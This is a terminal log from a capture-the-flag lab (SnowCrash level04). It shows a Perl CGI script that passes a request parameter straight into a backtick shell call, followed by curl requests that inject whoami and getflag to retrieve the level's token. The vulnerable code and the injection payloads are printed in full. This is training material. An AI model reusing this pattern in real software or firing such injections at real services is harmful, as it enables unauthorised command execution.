level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));


level04@SnowCrash:~$ ./level04.pl 'x=$(whoami)'
Content-type: text/html

level04

level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`whoami`'
flag04

level04@SnowCrash:~$ curl 'localhost:4747/level04.pl?x=`getflag`'
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
level04@SnowCrash:~$